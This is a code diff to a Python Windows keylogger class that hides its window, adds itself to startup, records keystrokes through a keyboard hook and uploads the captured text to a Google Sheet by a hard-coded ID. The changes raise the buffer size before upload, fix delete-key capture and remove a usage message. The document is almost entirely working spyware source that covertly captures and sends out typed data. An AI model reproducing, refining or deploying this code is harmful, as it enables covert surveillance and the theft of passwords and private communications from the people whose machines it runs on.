@@ -59,10 +59,6 @@ class Keylogger():
         win32gui.ShowWindow(window, 0)
         return True
 
-    def msg(self):
-        print("""Usage : """)
-        return True
-
     # Add to startup
     def addStartup(self):
         fp = os.path.dirname(os.path.realpath(__file__))
@@ -91,9 +87,9 @@ class Keylogger():
 
     # Send logs to google form
     def gsheet_logs(self):
-        if len(self.data) > 9:
+        if len(self.data) > 20:
             print('sending to the cloud')
-            row = [self.context,self.data]
+            row = [self.context, self.data]
             index = 1
             sheet = gsheetinit("15okwR0eO_WRlAtIc6HLRgjOQ8rpYerWwMg6-EyCIblI")
             try:
@@ -103,6 +99,7 @@ class Keylogger():
                 print('error fatal man')
                 pass
             self.data=''
+        print('yes')
         return True
 
     def OnKeyboardEvent(self, event):
@@ -115,7 +112,7 @@ class Keylogger():
         elif event.Key == 'Capital':  # caps lock
             self.caps = not self.caps
         elif event.Key == 'Back' or event.Key == 'Delete':  # del
-            self.data = '<del>'
+            self.data += '<del>'
         elif event.KeyID in range(31, 128) or event.KeyID == 13 or event.KeyID == 9:
             if (self.shift or self.caps) and event.KeyID in range(97, 123):
                 key = chr(event.KeyID-32)
